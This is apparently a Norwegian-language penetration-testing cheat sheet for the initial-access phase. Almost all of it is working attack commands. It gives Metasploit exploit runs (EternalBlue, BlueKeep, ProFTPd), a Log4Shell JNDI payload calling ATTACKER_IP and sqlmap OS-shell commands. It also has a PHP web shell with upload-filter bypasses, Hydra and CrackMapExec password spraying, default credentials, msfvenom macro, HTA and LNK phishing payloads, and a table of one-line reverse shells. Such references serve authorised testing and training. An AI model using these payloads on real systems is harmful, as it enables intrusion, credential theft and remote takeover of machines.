# 🚪 Fase 1: Innledende tilgang

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Mål:** Få et første fotfeste i målnettverket eller målsystemet.

---

## 🎯 Angrepsvektorer

Et *exploit* utnytter en sårbarhet. En *payload* er koden eller handlingen som leveres. Et *reverse shell* oppretter en forbindelse tilbake til en lytter på testmaskinen.

| Vektor | Beskrivelse |
|--------|-------------|
| **Utnytt offentlig tilgjengelig applikasjon** | Sårbarheter i webapplikasjoner, API-er og CMS-er |
| **Phishing (nettfisking)** | Ondsinnede e-poster med payloads |
| **Gyldige påloggingsopplysninger** | Password spraying og credential stuffing |
| **Eksterne tjenester** | Eksponert RDP, SSH, VPN og FTP |
| **Leverandørkjede** | Kompromittering av betrodd programvare |

---

## 💻 Utnyttelse av kjente sårbarheter

### Søk etter exploits
```bash
# SearchSploit – lokal exploit-database
searchsploit apache 2.4
searchsploit -m 41234  # Kopier exploit til gjeldende mappe
searchsploit --nmap scan.xml  # Tolk Nmap-resultater

# Søk i Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Vanlige exploits

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Sjekk om målet er sårbart
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Utnytt med Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Test for sårbarheten
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Sett opp exploit-server
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange

> **Merknad:** Navnene på NSE-skriptet, Python-skriptet og JAR-filen i disse eksemplene forutsetter eksterne verktøy. Tilgjengelighet og syntaks må kontrolleres i det aktuelle prosjektets dokumentasjon.
```bash
# Skann etter ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Bruk exploit
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Angrep mot webapplikasjoner

### SQL-injeksjon (få et shell)
```bash
# Test for SQLi
sqlmap -u "http://target.com/page?id=1" --batch

# Få et OS-shell via SQLi
sqlmap -u "http://target.com/page?id=1" --os-shell

# Få et SQL-shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Fra filopplasting til shell

> **Merknad:** Filendelsene er testeksempler fra originalen. Effekten avhenger av serverens filhåndtering og konfigurasjon; en alternativ filendelse gjør ikke automatisk en fil kjørbar.
```bash
# Opprett et PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Eller et enkelt PHP-shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Omgå filtre for filendelser
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Ekstern kodekjøring (RCE)
```bash
# Test for RCE
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Reverse shell via RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Angrep mot påloggingsopplysninger

### Password spraying (ett passord mot mange kontoer)
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential stuffing (gjenbruk av lekkede påloggingsopplysninger)
```bash
# Bruk kjente, lekkede påloggingsopplysninger
hydra -C creds.txt ftp://192.168.1.10

# Format for creds.txt:
# username:password
```

### Standard påloggingsopplysninger
```bash
# Vanlige standardverdier å prøve:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec med vanlige påloggingsopplysninger
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Payloads for phishing

### Payload i en Office-makro
```bash
# Generer makro-payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Eller bruk msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### HTA-payload
```bash
# Generer HTA-fil
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Gjør filen tilgjengelig via HTTP
python3 -m http.server 80
```

### LNK-payload
```powershell
# Opprett en ondsinnet snarvei
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Utnyttelse av eksternt tilgjengelige tjenester

### Utnyttelse av RDP
```bash
# Brute force mot RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### Utnyttelse av SSH
```bash
# Brute force mot SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH med kjente påloggingsopplysninger
ssh user@192.168.1.10

# SSH med privat nøkkel
ssh -i id_rsa user@192.168.1.10
```

### Utnyttelse av FTP
```bash
# Anonym innlogging
ftp 192.168.1.10
# Brukernavn: anonymous
# Passord: anonymous

# Brute force (prøving av mange kombinasjoner)
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# Exploit for ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Sette opp lyttere (listeners)

### Netcat-lytter
```bash
nc -lvnp 4444
```

### Metasploit-handler
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# På angriperens maskin
powercat -l -p 4444

# På målmaskinen
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Hurtigreferanse

### Reverse shell på én linje

| Operativsystem | Kommando |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Relaterte hurtigguider

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [Websårbarheter](../../SSRF/README.md)

---

**Neste fase:** [02 - Kartlegging og oppdagelse →](./02-Enumeration.nb.md)
